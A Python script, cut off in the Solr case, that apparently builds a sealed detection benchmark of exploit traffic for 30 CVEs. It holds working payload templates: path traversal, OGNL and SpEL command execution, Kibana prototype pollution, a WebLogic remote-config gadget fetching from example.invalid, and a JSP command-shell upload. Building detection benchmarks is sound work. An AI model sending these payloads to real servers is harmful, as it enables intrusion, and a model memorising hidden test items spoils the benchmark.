"""Build the sealed 30-CVE, 150-PCAP hidden-test-v1 dataset."""

from __future__ import annotations

import argparse
import hashlib
import json
import re
import sys
from pathlib import Path
from typing import Any
from urllib.parse import quote


PROJECT_DIR = Path(__file__).resolve().parents[1]
if str(PROJECT_DIR) not in sys.path:
    sys.path.insert(0, str(PROJECT_DIR))

from benchmarks.build_v0_cases import (  # noqa: E402
    CaseDefinition,
    request,
    render_request,
    render_response,
    response,
    sample,
)
from generate_pcap import generate_pcap  # noqa: E402


DEFAULT_ROOT = PROJECT_DIR / "benchmarks" / "hidden-test-v1"
VULHUB_REPOSITORY = "https://github.com/vulhub/vulhub.git"
VULHUB_COMMIT = "aeaf65793f147f29bd50841ef77f4e9cad07ecc7"


def _json(value: object, *, pretty: bool = False, sort_keys: bool = False) -> str:
    return json.dumps(
        value,
        ensure_ascii=False,
        indent=2 if pretty else None,
        separators=None if pretty else (",", ":"),
        sort_keys=sort_keys,
    )


def _lower_percent_escapes(value: str) -> str:
    return re.sub(
        r"%[0-9A-F]{2}",
        lambda match: "%" + match.group(0)[1:].lower(),
        value,
    )


def _ognl_26134(command: str, *, lower_escapes: bool = False) -> str:
    expression = (
        '${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime()'
        f'.exec("{command}").getInputStream(),"utf-8")).'
        '(@com.opensymphony.webwork.ServletActionContext@getResponse()'
        '.setHeader("X-Cmd-Response",#a))}'
    )
    target = "/" + quote(expression, safe="") + "/"
    return _lower_percent_escapes(target) if lower_escapes else target


def _ognl_22527(command: str, *, reverse_fields: bool = False) -> str:
    label = (
        r"\u0027+#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d"
        r".internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})+\u0027"
    )
    expression = (
        "@org.apache.struts2.ServletActionContext@getResponse().setHeader("
        f"'X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({{\"{command}\"}}))"
    )
    fields = [("label", label), ("x", expression)]
    if reverse_fields:
        fields.reverse()
    return "&".join(f"{name}={quote(value, safe='@().,#{}[]')}" for name, value in fields)


def _kibana_timelion(command: str, *, pretty: bool = False) -> str:
    expression = (
        ".es(*).props(label.__proto__.env.AAAA='require(\"child_process\")"
        f".exec(\"{command}\");process.exit()//').props("
        "label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"
    )
    return _json(
        {
            "sheet": [expression],
            "time": {
                "from": "now-15m",
                "to": "now",
                "mode": "quick",
                "interval": "auto",
                "timezone": "UTC",
            },
        },
        pretty=pretty,
        sort_keys=pretty,
    )


def _craft_psy(log_path: str, *, pretty: bool = False) -> str:
    return _json(
        {
            "config": {
                "name": "test",
                "as detector": {
                    "class": r"\Psy\Configuration",
                    "__construct()": {"config": {"configFile": log_path}},
                },
            },
            "test": r"craft\elements\conditions\users\UserCondition",
        },
        pretty=pretty,
        sort_keys=pretty,
    )


def _gateway_route(route_id: str, command: str, *, pretty: bool = False) -> str:
    return _json(
        {
            "id": route_id,
            "filters": [
                {
                    "name": "AddResponseHeader",
                    "args": {
                        "name": "Result",
                        "value": (
                            "#{new String(T(org.springframework.util.StreamUtils)"
                            ".copyToByteArray(T(java.lang.Runtime).getRuntime()"
                            f'.exec(new String[]{{"{command}"}}).getInputStream()))}}'
                        ),
                    },
                }
            ],
            "uri": "http://example.invalid",
        },
        pretty=pretty,
        sort_keys=pretty,
    )


def _spring_patch(command: str, *, pretty: bool = False) -> str:
    expression = (
        "T(java.lang.Runtime).getRuntime().exec("
        f"'{command}')/lastname"
    )
    return _json(
        [{"op": "replace", "path": expression, "value": "benchmark"}],
        pretty=pretty,
        sort_keys=pretty,
    )


def _laravel_solution(view_file: str, *, pretty: bool = False) -> str:
    return _json(
        {
            "solution": r"Facade\Ignition\Solutions\MakeViewVariableOptionalSolution",
            "parameters": {"variableName": "username", "viewFile": view_file},
        },
        pretty=pretty,
        sort_keys=pretty,
    )


def _solr_dih(command: str) -> str:
    config = (
        "<dataConfig><script><![CDATA[function poc(){java.lang.Runtime.getRuntime()"
        f'.exec("{command}");}}]]></script><document><entity name="sample" '
        'fileName=".*" baseDir="/" processor="FileListEntityProcessor" '
        'recursive="false" transformer="script:poc" /></document></dataConfig>'
    )
    return (
        "command=full-import&verbose=false&clean=false&commit=true&debug=true&"
        "core=demo&dataConfig=" + quote(config, safe="") + "&name=dataimport"
    )


def _velocity_target(core: str, command: str, *, lower_escapes: bool = False) -> str:
    template = (
        "#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) "
        f"#set($ex=$rt.getRuntime().exec('{command}')) $ex.waitFor()"
    )
    target = (
        f"/solr/{core}/select?q=1&wt=velocity&v.template=custom&"
        "v.template.custom=" + quote(template, safe="")
    )
    return _lower_percent_escapes(target) if lower_escapes else target


def _weblogic_xml(command: str, *, writer: bool = False) -> str:
    if writer:
        operation = (
            '<object class="java.io.PrintWriter"><string>/tmp/benchmark.jsp</string>'
            '<void method="println"><string>benchmark</string></void>'
            '<void method="close"/></object>'
        )
    else:
        operation = (
            '<void class="java.lang.ProcessBuilder"><array class="java.lang.String" '
            f'length="1"><void index="0"><string>{command}</string></void></array>'
            '<void method="start"/></void>'
        )
    return (
        '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
        '<soapenv:Header><work:WorkContext '
        'xmlns:work="http://bea.com/2004/06/soap/workarea/">'
        '<java version="1.4.0" class="java.beans.XMLDecoder">'
        + operation
        + '</java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'
    )


def _grafana_query(expression: str, *, pretty: bool = False) -> str:
    return _json(
        {
            "queries": [
                {
                    "refId": "A",
                    "datasource": {
                        "type": "__expr__",
                        "uid": "__expr__",
                        "name": "Expression",
                    },
                    "type": "sql",
                    "expression": expression,
                }
            ],
            "from": "1",
            "to": "2",
        },
        pretty=pretty,
        sort_keys=pretty,
    )


def definitions() -> tuple[CaseDefinition, ...]:
    json_headers = {"Content-Type": "application/json"}
    form_headers = {"Content-Type": "application/x-www-form-urlencoded"}
    xml_headers = {"Content-Type": "text/xml"}
    protected = response("unauthorized", status=401, reason="Unauthorized")
    not_found = response("not found", status=404, reason="Not Found")

    drupal_destination = (
        "/?q=user/1/cancel&destination=user/1/cancel%3Fq%5B%2523post_render%5D%5B%5D"
        "%3Dpassthru%26q%5B%2523type%5D%3Dmarkup%26q%5B%2523markup%5D%3Did"
    )
    weblogic_prefix = "/console/css/%252e%252e%252fconsole.portal"
    grafana_target = "/api/ds/query?ds_type=__expr__&expression=true&requestId=Q100"

    return (
        CaseDefinition(
            "CVE-2021-42013",
            "double_encoded_path_traversal",
            "Apache HTTP Server 2.4.50 incompletely fixed alias path traversal, allowing double-encoded dot segments to escape an accessible directory and read files or reach CGI executables.",
            "Use double-encoded parent-directory segments below an existing /icons/ or /cgi-bin/ alias.",
            sample("original", request("GET", "/icons/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd"), response("root:x:0:0:root:/root:/bin/sh\n"), "double-encoded traversal reads /etc/passwd"),
            (
                sample("positive-01", request("GET", "/icons/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/hosts"), response("127.0.0.1 localhost\n"), "different local-file target"),
                sample("positive-02", request("POST", "/cgi-bin/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/bin/sh", headers=form_headers, body="echo;id"), response("uid=33(www-data)\n"), "CGI execution using the same double-encoded traversal"),
            ),
            (
                sample("negative-01", request("GET", "/icons/apache_pb.gif"), response("GIF", content_type="image/gif"), "normal asset on the alias"),
                sample("negative-02", request("GET", "/static/.%252e/.%252e/.%252e/etc/passwd"), not_found, "exploit text outside a vulnerable alias"),
            ),
        ),
        CaseDefinition(
            "CVE-2015-3337",
            "plugin_directory_traversal",
            "Elasticsearch before 1.4.5 and 1.5.2 permits arbitrary file read through parent-directory segments in the site-plugin asset route.",
            "Traverse from /_plugin/<installed-plugin>/ to a local filesystem path.",
            sample("original", request("GET", "/_plugin/head/../../../../../../../../../etc/passwd"), response("root:x:0:0:root:/root:/bin/sh\n"), "site-plugin traversal reads passwd"),
            (
                sample("positive-01", request("GET", "/_plugin/head/../../../../../../../../../etc/hosts"), response("127.0.0.1 localhost\n"), "different file target"),
                sample("positive-02", request("GET", "/_plugin/head/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"), response("root:x:0:0:root:/root:/bin/sh\n"), "encoded slash representation"),
            ),
            (
                sample("negative-01", request("GET", "/_plugin/head/index.html"), response("plugin ui", content_type="text/html"), "normal plugin asset"),
                sample("negative-02", request("GET", "/_plugins/head/../../../../etc/passwd"), not_found, "lookalike route outside the vulnerable handler"),
            ),
        ),
        CaseDefinition(
            "CVE-2015-5531",
            "snapshot_directory_traversal",
            "Elasticsearch snapshot and restore handling before 1.6.1 permits encoded traversal in a repository snapshot path and can expose local files through an error response.",
            "Request a snapshot repository path containing encoded slash and parent-directory components.",
            sample("original", request("GET", "/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"), response("encoded file content", status=500, reason="Internal Server Error"), "encoded snapshot traversal targets passwd"),
            (
                sample("positive-01", request("GET", "/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2fetc%2fhosts"), response("encoded hosts", status=500, reason="Internal Server Error"), "different file target"),
                sample("positive-02", request("GET", "/_snapshot/archive/data%2F..%2F..%2F..%2F..%2Fetc%2Fshadow"), response("encoded shadow", status=500, reason="Internal Server Error"), "different repository and uppercase encoding"),
            ),
            (
                sample("negative-01", request("GET", "/_snapshot/test/_all"), response('{"snapshots":[]}', content_type="application/json"), "normal snapshot listing"),
                sample("negative-02", request("GET", "/_search?q=backdata%2f..%2fetc%2fpasswd"), response('{"hits":[]}', content_type="application/json"), "traversal text outside snapshot API"),
            ),
        ),
        CaseDefinition(
            "CVE-2018-17246",
            "local_file_inclusion",
            "Kibana Console before 6.4.3 and 5.6.13 accepts a user-controlled apis module path and can include files outside the Console plugin.",
            "Supply parent-directory traversal in the apis query parameter of /api/console/api_server.",
            sample("original", request("GET", "/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd"), response("module load error", status=500, reason="Internal Server Error"), "Console API includes passwd"),
            (
                sample("positive-01", request("GET", "/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/hosts"), response("module load error", status=500, reason="Internal Server Error"), "different file target"),
                sample("positive-02", request("GET", "/api/console/api_server?apis=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&sense_version=%40%40SENSE_VERSION"), response("module load error", status=500, reason="Internal Server Error"), "encoded slashes and query reordering"),
            ),
            (
                sample("negative-01", request("GET", "/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=./lib/spec_definitions"), response("ok", content_type="application/json"), "normal Console API module"),
                sample("negative-02", request("GET", "/api/status?apis=../../../../etc/passwd"), response("ok", content_type="application/json"), "traversal parameter on another API"),
            ),
        ),
        CaseDefinition(
            "CVE-2021-34429",
            "ambiguous_path_disclosure",
            "Jetty 9.4.37 through 9.4.42 and related 10/11 releases can expose WEB-INF content through ambiguous encoded path components involving Unicode-dot or null-byte forms.",
            "Request WEB-INF/web.xml through an ambiguous encoded path that bypasses protected-resource checks.",
            sample("original", request("GET", "/%u002e/WEB-INF/web.xml"), response("<web-app></web-app>", content_type="application/xml"), "Unicode-dot bypass"),
            (
                sample("positive-01", request("GET", "/.%00/WEB-INF/web.xml"), response("<web-app></web-app>", content_type="application/xml"), "dot-null bypass"),
                sample("positive-02", request("GET", "/a/b/..%00/WEB-INF/web.xml"), response("<web-app></web-app>", content_type="application/xml"), "parent-null ambiguous path"),
            ),
            (
                sample("negative-01", request("GET", "/WEB-INF/web.xml"), protected, "direct protected-resource request is blocked"),
                sample("negative-02", request("GET", "/%u002e/public/index.html"), response("public page", content_type="text/html"), "ambiguous path to a non-protected resource"),
            ),
        ),
        CaseDefinition(
            "CVE-2010-2861",
            "locale_directory_traversal",
            "Adobe ColdFusion 9.0.1 and earlier permits traversal in the locale parameter of several CFIDE administrator pages, with a null-byte language suffix.",
            "Use parent-directory traversal and a null-byte suffix in locale on a vulnerable CFIDE page.",
            sample("original", request("GET", "/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en"), response("root:x:0:0:root:/root:/bin/sh\n"), "locale traversal reads passwd"),
            (
                sample("positive-01", request("GET", "/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en"), response("password=encrypted\n"), "different protected target"),
                sample("positive-02", request("GET", "/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../../../../etc/hosts%00en"), response("127.0.0.1 localhost\n"), "alternate vulnerable administrator page"),
            ),
            (
                sample("negative-01", request("GET", "/CFIDE/administrator/enter.cfm?locale=en_US"), response("login", content_type="text/html"), "normal locale"),
                sample("negative-02", request("GET", "/login.cfm?locale=../../../../etc/passwd%00en"), not_found, "same parameter outside CFIDE administrator"),
            ),
        ),
        CaseDefinition(
            "CVE-2019-3396",
            "template_path_traversal",
            "Confluence before 6.14.2 permits unauthenticated widget macro preview requests to select arbitrary template locations, enabling file read and possible Velocity template execution.",
            "POST widget macro JSON with an attacker-controlled _template parameter.",
            sample("original", request("POST", "/rest/tinymce/1/macro/preview", headers=json_headers, body=_json({"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://example.invalid/video","_template":"../web.xml"}}})), response("<web-app></web-app>", content_type="text/html"), "relative template traversal reads web.xml"),
            (
                sample("positive-01", request("POST", "/rest/tinymce/1/macro/preview", headers=json_headers, body=_json({"contentId":"2","macro":{"name":"widget","body":"","params":{"url":"https://example.invalid/video","_template":"file:///etc/passwd"}}})), response("root:x:0:0:root:/root:/bin/sh\n"), "file URI target"),
                sample("positive-02", request("POST", "/rest/tinymce/1/macro/preview", headers=json_headers, body=_json({"macro":{"params":{"_template":"../../WEB-INF/web.xml","url":"https://example.invalid/x"},"body":"","name":"widget"},"contentId":"3"}, pretty=True)), response("<web-app></web-app>"), "deeper traversal and JSON reordering"),
            ),
            (
                sample("negative-01", request("POST", "/rest/tinymce/1/macro/preview", headers=json_headers, body=_json({"contentId":"4","macro":{"name":"widget","body":"","params":{"url":"https://example.invalid/video","_template":"com/atlassian/confluence/widget.vm"}}})), response("preview", content_type="text/html"), "normal bundled template"),
                sample("negative-02", request("POST", "/rest/api/content", headers=json_headers, body=_json({"_template":"file:///etc/passwd"})), response("invalid", status=400, reason="Bad Request"), "template field outside macro preview"),
            ),
        ),
        CaseDefinition(
            "CVE-2022-26134",
            "ognl_path_injection",
            "Confluence Server and Data Center contain a pre-auth OGNL injection where an expression embedded in the request path can execute an attacker-selected command.",
            "Place a URL-encoded OGNL Runtime.exec expression directly in the request path.",
            sample("original", request("GET", _ognl_26134("id")), response("uid=2002(confluence)"), "encoded OGNL executes id"),
            (
                sample("positive-01", request("GET", _ognl_26134("whoami")), response("confluence"), "different command"),
                sample("positive-02", request("GET", _ognl_26134("uname -a", lower_escapes=True)), response("Linux benchmark"), "lowercase percent escapes and another command"),
            ),
            (
                sample("negative-01", request("GET", "/login.action"), response("login", content_type="text/html"), "normal Confluence route"),
                sample("negative-02", request("GET", "/api/search?query=" + quote('${@java.lang.Runtime@getRuntime().exec("id")}', safe="")), response("no results", content_type="application/json"), "OGNL-like text in an unrelated query API"),
            ),
        ),
        CaseDefinition(
            "CVE-2023-22527",
            "ognl_template_injection",
            "Confluence 8.0 through 8.5.3 permits pre-auth OGNL evaluation in the text-inline Velocity template through a label and x parameter chain.",
            "POST form data to /template/aui/text-inline.vm that obtains the OGNL context and evaluates attacker-controlled x.",
            sample("original", request("POST", "/template/aui/text-inline.vm", headers=form_headers, body=_ognl_22527("id")), response("uid=2002(confluence)"), "documented text-inline OGNL chain"),
            (
                sample("positive-01", request("POST", "/template/aui/text-inline.vm", headers=form_headers, body=_ognl_22527("whoami")), response("confluence"), "different command"),
                sample("positive-02", request("POST", "/template/aui/text-inline.vm", headers=form_headers, body=_ognl_22527("uname -a", reverse_fields=True)), response("Linux benchmark"), "form-field reordering and another command"),
            ),
            (
                sample("negative-01", request("POST", "/template/aui/text-inline.vm", headers=form_headers, body="label=Release+notes&x=plain-text"), response("Release notes", content_type="text/html"), "normal template rendering"),
                sample("negative-02", request("POST", "/template/aui/text.vm", headers=form_headers, body=_ognl_22527("id")), not_found, "same payload on a non-vulnerable template"),
            ),
        ),
        CaseDefinition(
            "CVE-2018-7602",
            "authenticated_form_rce",
            "Drupal 7 before the fixed releases permits authenticated Form API cache poisoning through a doubly encoded post_render callback in the cancellation destination parameter.",
            "Poison user_cancel_confirm_form through destination containing %2523post_render, then trigger the cached form.",
            sample("original", request("POST", drupal_destination, headers=form_headers, body="form_id=user_cancel_confirm_form&form_token=benchmark&_triggering_element_name=form_id&op=Cancel+account"), response("poisoned form", content_type="text/html"), "double-encoded post_render with passthru"),
            (
                sample("positive-01", request("POST", drupal_destination.replace("%3Did", "%3Dwhoami").replace("user/1", "user/2"), headers=form_headers, body="form_id=user_cancel_confirm_form&form_token=token2&_triggering_element_name=form_id&op=Cancel+account"), response("poisoned form", content_type="text/html"), "different user and command"),
                sample("positive-02", request("POST", drupal_destination.replace("passthru", "exec").replace("%3Did", "%3Duname%2520-a"), headers=form_headers, body="op=Cancel+account&_triggering_element_name=form_id&form_token=token3&form_id=user_cancel_confirm_form"), response("poisoned form", content_type="text/html"), "different callback and form-field order"),
            ),
            (
                sample("negative-01", request("POST", "/?q=user/1/cancel", headers=form_headers, body="form_id=user_cancel_confirm_form&form_token=benchmark&op=Cancel+account"), response("confirm", content_type="text/html"), "normal cancellation form"),
                sample("negative-02", request("POST", "/api/profile?destination=" + quote("q[#post_render][]=passthru", safe=""), headers=form_headers, body="name=benchmark"), response("updated", content_type="application/json"), "render syntax outside Drupal cancellation flow"),
            ),
        ),
        CaseDefinition(
            "CVE-2019-7609",
            "prototype_pollution_rce",
            "Kibana before 5.6.15 and 6.6.1 permits Timelion expressions to pollute Object.prototype environment properties and achieve code execution when another application is opened.",
            "POST a Timelion sheet that assigns __proto__.env properties including NODE_OPTIONS and a command-loading value.",
            sample("original", request("POST", "/api/timelion/run", headers={"Content-Type":"application/json","kbn-version":"6.5.4"}, body=_kibana_timelion("touch /tmp/hidden")), response('{"sheet":[]}', content_type="application/json"), "Timelion prototype pollution payload"),
            (
                sample("positive-01", request("POST", "/api/timelion/run", headers={"Content-Type":"application/json","kbn-version":"6.5.4"}, body=_kibana_timelion("id > /tmp/id")), response('{"sheet":[]}', content_type="application/json"), "different command"),
                sample("positive-02", request("POST", "/api/timelion/run", headers={"kbn-version":"6.5.4","Content-Type":"application/json"}, body=_kibana_timelion("whoami > /tmp/user", pretty=True)), response('{"sheet":[]}', content_type="application/json"), "JSON and header ordering variation"),
            ),
            (
                sample("negative-01", request("POST", "/api/timelion/run", headers={"Content-Type":"application/json","kbn-version":"6.5.4"}, body=_json({"sheet":[".es(*)"],"time":{"from":"now-15m","to":"now"}})), response('{"sheet":[]}', content_type="application/json"), "normal Timelion expression"),
                sample("negative-02", request("POST", "/api/console/proxy", headers=json_headers, body=_kibana_timelion("id")), response("invalid", status=400, reason="Bad Request"), "prototype payload outside Timelion"),
            ),
        ),
        CaseDefinition(
            "CVE-2023-41892",
            "arbitrary_object_instantiation",
            "Craft CMS 4.4.0 through 4.4.14 permits unauthenticated arbitrary object instantiation through ConditionsController configuration, enabling file inclusion or other gadget chains.",
            "POST attacker-controlled class and constructor configuration to index.php?action=conditions/render.",
            sample("original", request("POST", "/index.php?action=conditions/render", headers=json_headers, body=_craft_psy("../storage/logs/web-2026-08-03.log")), response("render error", status=500, reason="Internal Server Error"), "Psy Configuration includes a log file"),
            (
                sample("positive-01", request("POST", "/index.php?action=conditions/render", headers=json_headers, body=_craft_psy("../storage/logs/web-2026-08-04.log")), response("render error", status=500, reason="Internal Server Error"), "different sample log path"),
                sample("positive-02", request("POST", "/index.php?action=conditions/render", headers=json_headers, body=_craft_psy("../../storage/logs/queue.log", pretty=True)), response("render error", status=500, reason="Internal Server Error"), "JSON reordering and another target file"),
            ),
            (
                sample("negative-01", request("POST", "/index.php?action=conditions/render", headers=json_headers, body=_json({"config":{"name":"test"},"test":r"craft\elements\conditions\users\UserCondition"})), response("condition", content_type="application/json"), "normal condition object without injected class"),
                sample("negative-02", request("POST", "/index.php?action=users/save", headers=json_headers, body=_craft_psy("../storage/logs/web.log")), protected, "class configuration on another controller"),
            ),
        ),
        CaseDefinition(
            "CVE-2020-14882",
            "console_auth_bypass_rce",
            "Oracle WebLogic Console contains a double-encoded path authentication bypass that can be chained with console handle gadget invocation for pre-auth command execution.",
            "Use /console/css/%252e%252e%252fconsole.portal and a crafted handle parameter.",
            sample("original", request("GET", weblogic_prefix + "?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec('id');%22)"), response("console portal", content_type="text/html"), "ShellSession RCE through bypassed console"),
            (
                sample("positive-01", request("GET", weblogic_prefix + "?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec('whoami');%22)"), response("console portal", content_type="text/html"), "different command"),
                sample("positive-02", request("GET", weblogic_prefix + "?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(%22http://example.invalid/rce.xml%22)"), response("console portal", content_type="text/html"), "alternate FileSystemXmlApplicationContext gadget"),
            ),
            (
                sample("negative-01", request("GET", "/console/login/LoginForm.jsp"), response("login", content_type="text/html"), "normal console login"),
                sample("negative-02", request("GET", "/admin/css/%252e%252e%252fconsole.portal?handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22id%22)"), not_found, "same gadget outside WebLogic Console route"),
            ),
        ),
        CaseDefinition(
            "CVE-2017-12615",
            "jsp_upload",
            "Tomcat with a writable DefaultServlet permits HTTP PUT requests using a JSP filename bypass form to write executable server-side content.",
            "PUT JSP content to a path ending in .jsp/ or an equivalent filename bypass.",
            sample("original", request("PUT", "/hidden.jsp/", headers={"Content-Type":"application/octet-stream"}, body='<% out.print("hidden"); %>'), response("created", status=201, reason="Created"), "trailing-slash JSP upload"),
            (
                sample("positive-01", request("PUT", "/cmd.jsp/", headers={"Content-Type":"application/octet-stream"}, body='<% Runtime.getRuntime().exec(request.getParameter("c")); %>'), response("created", status=201, reason="Created"), "different JSP filename and payload"),
                sample("positive-02", request("PUT", "/probe.jsp%20", headers={"Content-Type":"application/octet-stream"}, body='<% out.print(System.getProperty("os.name")); %>'), response("created", status=201, reason="Created"), "encoded trailing-space filename bypass"),
            ),
            (
                sample("negative-01", request("PUT", "/notes.txt", headers={"Content-Type":"text/plain"}, body="release notes"), response("created", status=201, reason="Created"), "ordinary writable text resource"),
                sample("negative-02", request("POST", "/hidden.jsp/", headers=form_headers, body="name=benchmark"), response("method not allowed", status=405, reason="Method Not Allowed"), "same path without PUT upload primitive"),
            ),
        ),
        CaseDefinition(
            "CVE-2022-22963",
            "spel_header_injection",
            "Spring Cloud Function 3.2.2 and related affected releases evaluate the spring.cloud.function.routing-expression request header as SpEL.",
            "POST to functionRouter with a Runtime.exec SpEL expression in the routing-expression header.",
            sample("original", request("POST", "/functionRouter", headers={"Content-Type":"text/plain","spring.cloud.function.routing-expression":'T(java.lang.Runtime).getRuntime().exec("touch /tmp/hidden")'}, body="test"), response("ok"), "routing header executes command"),
            (
                sample("positive-01", request("POST", "/functionRouter", headers={"Content-Type":"text/plain","spring.cloud.function.routing-expression":'T(java.lang.Runtime).getRuntime().exec("id")'}, body="data"), response("ok"), "different command and body"),
                sample("positive-02", request("POST", "/functionRouter", headers={"Spring.Cloud.Function.Routing-Expression":'T(java.lang.Runtime).getRuntime().exec("whoami")',"Content-Type":"text/plain"}, body="x"), response("ok"), "header casing and ordering variation"),
            ),
            (
                sample("negative-01", request("POST", "/functionRouter", headers={"Content-Type":"text/plain","spring.cloud.function.routing-expression":"uppercase"}, body="test"), response("TEST"), "normal routing expression"),
                sample("negative-02", request("POST", "/api/router", headers={"Content-Type":"text/plain","spring.cloud.function.routing-expression":'T(java.lang.Runtime).getRuntime().exec("id")'}, body="test"), not_found, "dangerous header outside function endpoint"),
            ),
        ),
        CaseDefinition(
            "CVE-2022-22947",
            "gateway_spel_injection",
            "Spring Cloud Gateway exposes an unsafe Actuator route-definition API where filter argument values can contain attacker-controlled SpEL and execute code when refreshed.",
            "POST an AddResponseHeader route containing a Runtime.exec SpEL expression to /actuator/gateway/routes/<id>.",
            sample("original", request("POST", "/actuator/gateway/routes/hidden", headers=json_headers, body=_gateway_route("hidden", "id")), response("created", status=201, reason="Created"), "malicious actuator route"),
            (
                sample("positive-01", request("POST", "/actuator/gateway/routes/probe", headers=json_headers, body=_gateway_route("probe", "whoami")), response("created", status=201, reason="Created"), "different route and command"),
                sample("positive-02", request("POST", "/actuator/gateway/routes/audit", headers=json_headers, body=_gateway_route("audit", "uname -a", pretty=True)), response("created", status=201, reason="Created"), "JSON formatting and another command"),
            ),
            (
                sample("negative-01", request("POST", "/actuator/gateway/routes/public", headers=json_headers, body=_json({"id":"public","filters":[{"name":"AddResponseHeader","args":{"name":"X-App","value":"public"}}],"uri":"http://example.invalid"})), response("created", status=201, reason="Created"), "normal route configuration"),
                sample("negative-02", request("POST", "/api/gateway/routes/hidden", headers=json_headers, body=_gateway_route("hidden", "id")), not_found, "SpEL route outside Actuator"),
            ),
        ),
        CaseDefinition(
            "CVE-2017-8046",
            "json_patch_spel_injection",
            "Spring Data REST before 2.6.9 and 3.0.1 evaluates JSON Patch path values as SpEL, allowing command execution through PATCH resource requests.",
            "PATCH a REST resource using application/json-patch+json and a Runtime.exec expression in path.",
            sample("original", request("PATCH", "/customers/1", headers={"Content-Type":"application/json-patch+json"}, body=_spring_patch("touch /tmp/hidden")), response('{"lastname":"benchmark"}', content_type="application/json"), "SpEL in JSON Patch path"),
            (
                sample("positive-01", request("PATCH", "/customers/2", headers={"Content-Type":"application/json-patch+json"}, body=_spring_patch("id")), response('{"lastname":"benchmark"}', content_type="application/json"), "different resource and command"),
                sample("positive-02", request("PATCH", "/customers/7", headers={"Content-Type":"application/json-patch+json"}, body=_spring_patch("whoami", pretty=True)), response('{"lastname":"benchmark"}', content_type="application/json"), "JSON formatting and another command"),
            ),
            (
                sample("negative-01", request("PATCH", "/customers/1", headers={"Content-Type":"application/json-patch+json"}, body=_json([{"op":"replace","path":"/lastname","value":"benchmark"}])), response('{"lastname":"benchmark"}', content_type="application/json"), "normal JSON Patch"),
                sample("negative-02", request("PATCH", "/profiles/1", headers={"Content-Type":"application/json"}, body=_spring_patch("id")), response("invalid", status=400, reason="Bad Request"), "SpEL-looking patch outside Spring Data REST shape"),
            ),
        ),
        CaseDefinition(
            "CVE-2021-3129",
            "ignition_file_wrapper_rce",
            "Laravel Ignition before 2.5.2 exposes execute-solution in debug mode and permits attacker-controlled stream-wrapper paths that form a log poisoning and Phar deserialization chain.",
            "POST MakeViewVariableOptionalSolution with a php://filter or phar:// viewFile to /_ignition/execute-solution.",
            sample("original", request("POST", "/_ignition/execute-solution", headers=json_headers, body=_laravel_solution("php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log")), response("solution executed", content_type="application/json"), "php filter targets Laravel log"),
            (
                sample("positive-01", request("POST", "/_ignition/execute-solution", headers=json_headers, body=_laravel_solution("php://filter/write=convert.quoted-printable-decode/resource=../storage/logs/laravel.log")), response("solution executed", content_type="application/json"), "different filter chain"),
                sample("positive-02", request("POST", "/_ignition/execute-solution", headers=json_headers, body=_laravel_solution("phar:///var/www/storage/logs/laravel.log/test.txt", pretty=True)), response("solution executed", content_type="application/json"), "Phar deserialization stage and JSON formatting"),
            ),
            (
                sample("negative-01", request("POST", "/_ignition/execute-solution", headers=json_headers, body=_laravel_solution("resources/views/welcome.blade.php")), response("solution executed", content_type="application/json"), "normal local view path"),
                sample("negative-02", request("POST", "/api/execute-solution", headers=json_headers, body=_laravel_solution("php://filter/resource=../storage/logs/laravel.log")), not_found, "wrapper path outside Ignition"),
            ),
        ),
        CaseDefinition(
            "CVE-2019-10758",
            "javascript_code_injection",
            "mongo-express before the fixed release passes the document form parameter into unsafe JavaScript evaluation, allowing authenticated or default-credential users to execute Node.js code.",
            "POST document=<constructor chain> to /checkValid using an authenticated session.",
            sample("original", request("POST", "/checkValid", headers={**form_headers,"Authorization":"Basic YWRtaW46cGFzcw=="}, body='document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("touch /tmp/hidden")'), response("valid", content_type="application/json"), "constructor-chain command execution"),
            (
                sample("positive-01", request("POST", "/checkValid", headers={**form_headers,"Authorization":"Basic YWRtaW46cGFzcw=="}, body='document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id")'), response("valid", content_type="application/json"), "different command"),
                sample("positive-02", request("POST", "/checkValid", headers={"Authorization":"Basic YWRtaW46cGFzcw==",**form_headers}, body='foo=1&document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("whoami")'), response("valid", content_type="application/json"), "query-form reordering and another command"),
            ),
            (
                sample("negative-01", request("POST", "/checkValid", headers={**form_headers,"Authorization":"Basic YWRtaW46cGFzcw=="}, body="document=benchmark"), response("valid", content_type="application/json"), "normal document value"),
                sample("negative-02", request("POST", "/api/check", headers=form_headers, body='document=this.constructor.constructor("return process")()'), not_found, "constructor chain outside mongo-express endpoint"),
            ),
        ),
        CaseDefinition(
            "CVE-2019-0193",
            "dataimport_script_rce",
            "Apache Solr DataImportHandler accepts externally supplied dataConfig containing script transformers, allowing unauthenticated command execution on exposed cores.",
